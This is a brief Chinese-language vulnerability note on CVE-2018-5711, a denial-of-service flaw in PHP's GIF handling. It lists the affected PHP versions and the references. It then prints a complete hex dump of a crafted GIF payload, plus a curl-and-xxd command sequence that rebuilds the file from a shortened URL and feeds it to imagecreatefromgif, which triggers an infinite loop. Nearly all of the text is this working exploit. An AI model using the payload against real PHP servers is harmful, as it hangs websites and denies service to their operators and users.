# CVE-2018-5711拒绝服务漏洞

## CVE-2018-5711拒绝服务漏洞

### 参考

- http://blog.orange.tw/2018/01/php-cve-2018-5711-hanging-websites-by.html?spm=a2c4g.11186623.2.11.621a6678RvxHft
- https://gist.githubusercontent.com/orangetw/adb0e2519df267eb54d8b68027a91d4c/raw/7a7d6938f59dd89e9a9b7304d71f8f6640609479/poc.gif.xxd

### 利用范围

- PHP 5 < 5.6.33
- PHP 7.0 < 7.0.27
- PHP 7.1 < 7.1.13
- PHP 7.2 < 7.2.1

### 测试

poc.gif

```text
00000000: 4749 4638 3961 4030 8230 9130 357c 3030  GIF89a@0.0.05|00
00000010: 3022 2e30 3030 3030 21f9 0401 3030 3000  0".00000!...000.
00000020: 2c30 0030 0040 0040 0048 03ff 8888 8888  ,0.0.@.@.H......
00000030: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000040: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000050: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000060: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000070: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000080: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000090: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000000f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000100: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000110: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000120: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000130: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000140: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000150: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000160: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000170: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000180: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000190: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000001f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000200: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000210: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000220: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000230: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000240: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000250: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000260: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000270: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000280: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000290: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000002f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000300: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000310: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000320: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000330: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000340: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000350: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000360: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000370: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000380: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000390: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000003f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000400: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000410: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000420: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000430: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000440: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000450: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000460: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000470: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000480: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000490: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000004f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000500: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000510: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000520: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000530: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000540: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000550: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000560: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000570: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000580: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000590: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005c0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005d0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005e0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000005f0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000600: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000610: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000620: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000630: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000640: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000650: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000660: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000670: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000680: 8888 8888 8888 8888 8888 8888 8888 8888  ................
00000690: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000006a0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000006b0: 8888 8888 8888 8888 8888 8888 8888 8888  ................
000006c0: 8888 88                                  ...
```

poc

```bash
$ curl -L https://git.io/vN0n4 | xxd -r > poc.gif
$ php -r 'imagecreatefromgif("poc.gif");'

  Infinite loop here...
```

